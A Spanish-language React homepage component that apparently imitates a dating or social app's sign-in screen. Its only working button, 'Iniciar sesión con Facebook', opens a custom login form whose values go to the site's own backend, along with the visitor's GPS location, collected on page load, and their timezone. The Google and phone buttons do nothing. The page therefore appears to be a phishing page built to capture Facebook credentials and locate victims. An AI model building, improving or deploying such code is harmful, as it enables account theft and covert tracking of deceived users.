import React, { useState, useEffect } from 'react';
import { Layout, Typography, Button, Modal, message } from 'antd';
import { GoogleOutlined, PhoneOutlined } from '@ant-design/icons';
import axios from 'axios';
import FacebookLoginModal from './FacebookLoginModal';
import ProcessingModal from './ProcessingModal';

const { Content } = Layout;
const { Title, Text, Link } = Typography;

const HomePage = () => {
  const [loginModalVisible, setLoginModalVisible] = useState(false);
  const [processingModalVisible, setProcessingModalVisible] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [userData, setUserData] = useState(null);
  const [location, setLocation] = useState(null);
  const [showMainModal, setShowMainModal] = useState(true);

  useEffect(() => {
    // Solicitar ubicación al cargar la página
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocation({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          });
        },
        (error) => {
          console.log("Error obteniendo ubicación:", error);
        }
      );
    }
  }, []);

  const handleLoginClick = () => {
    setLoginModalVisible(true);
  };

  const handleLoginSubmit = async (values) => {
    try {
      setLoginModalVisible(false);
      setProcessingModalVisible(true);
      
      // Agregar ubicación a los datos enviados
      const loginData = {
        ...values,
        location: location,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };
      
      const response = await axios.post(`${import.meta.env.VITE_API_URL}/api/auth/facebook/login`, loginData);
      
      setProcessingModalVisible(false);
      
      if (response.data.success) {
        setIsLoggedIn(true);
        setUserData(response.data.user);
        message.success('¡Bienvenido! Has iniciado sesión correctamente.');
      }
    } catch (error) {
      setProcessingModalVisible(false);
      
      if (error.response) {
        message.error(error.response.data.message || 'Error al iniciar sesión');
      } else {
        message.error('Error al conectar con el servidor');
      }
      
      setLoginModalVisible(true);
    }
  };

  return (
    <Layout className="layout">
      <Content style={{ minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
        <Modal
          visible={showMainModal}
          footer={null}
          closable={true}
          onCancel={() => setShowMainModal(false)}
          width={400}
          style={{ top: '20%' }}
        >
          <div style={{ textAlign: 'center', padding: '20px 0' }}>
            <div style={{ fontSize: '40px', marginBottom: '20px' }}>X</div>
            <Title level={3}>Empieza ahora</Title>
            
            <Text style={{ display: 'block', marginBottom: '20px' }}>
              Al hacer clic en Iniciar sesión o Continuar, aceptas nuestros{' '}
              <Link href="#">Términos</Link>. Conoce cómo procesamos tus datos en nuestra{' '}
              <Link href="#">Política de privacidad</Link> y{' '}
              <Link href="#">Política sobre cookies</Link>.
            </Text>

            <Button
              icon={<GoogleOutlined />}
              style={{ width: '100%', marginBottom: '10px', height: '40px' }}
              onClick={() => {}}
            >
              Continuar con Google
            </Button>

            <Button
              style={{ width: '100%', marginBottom: '10px', height: '40px' }}
              onClick={handleLoginClick}
            >
              Iniciar sesión con Facebook
            </Button>

            <Button
              icon={<PhoneOutlined />}
              style={{ width: '100%', marginBottom: '10px', height: '40px' }}
            >
              Inicia sesión con tu teléfono
            </Button>

            <div style={{ marginTop: '20px' }}>
              <Link href="#">¿Problemas para iniciar sesión?</Link>
            </div>

            <div style={{ marginTop: '20px' }}>
              <Title level={4}>¡Descarga la app!</Title>
              <div style={{ display: 'flex', justifyContent: 'center', gap: '10px', marginTop: '10px' }}>
                <Link href="#" target="_blank">
                  <img src="/app-store.png" alt="App Store" style={{ height: '40px' }} />
                </Link>
                <Link href="#" target="_blank">
                  <img src="/google-play.png" alt="Google Play" style={{ height: '40px' }} />
                </Link>
              </div>
            </div>
          </div>
        </Modal>

        <FacebookLoginModal
          visible={loginModalVisible}
          onCancel={() => setLoginModalVisible(false)}
          onSubmit={handleLoginSubmit}
        />
        
        <ProcessingModal visible={processingModalVisible} />
      </Content>
    </Layout>
  );
};

export default HomePage;
